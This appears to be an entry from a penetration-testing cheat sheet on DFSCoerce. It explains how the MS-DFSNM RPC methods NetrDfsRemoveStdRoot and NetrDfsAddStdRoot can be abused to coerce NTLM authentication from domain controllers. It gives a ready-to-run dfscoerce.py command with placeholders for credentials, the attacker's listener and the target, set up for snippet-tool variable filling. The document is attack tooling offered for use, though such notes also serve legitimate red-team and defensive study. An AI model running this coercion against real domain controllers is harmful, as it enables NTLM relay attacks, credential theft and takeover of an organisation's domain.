---
technique: MS-DFSNM Abuse (DFSCoerce)
category: mitm
targets: Domain Controllers
protocols: SMB, RPC
remote_capable: true
tags: mitm coercion ms-dfsnm dfscoerce rpc smb ntlm-relay domain-controller-only
---

# MS-DFSNM Abuse (DFSCoerce)

MS-DFSNM (Distributed File System Namespace Management protocol) exposes the `NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` RPC methods. These methods can be abused to coerce NTLM authentication from domain controllers. Unlike some other coercion primitives, this technique only works against domain controllers.

## Windows

No native Windows tooling is commonly used for this attack; see the Linux section.

## Linux

DFSCoerce implements the vulnerable MS-DFSNM methods.

### dfscoerce

#python #coercion #password

Force a domain controller to authenticate to the attacker's listener via the MS-DFSNM RPC interface.

```sh title:"Coerce DC authentication via MS-DFSNM with DFSCoerce"
dfscoerce.py -d "$domain" -u "$user" -p "$pass" "$lhost" "$rhost"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost
-->
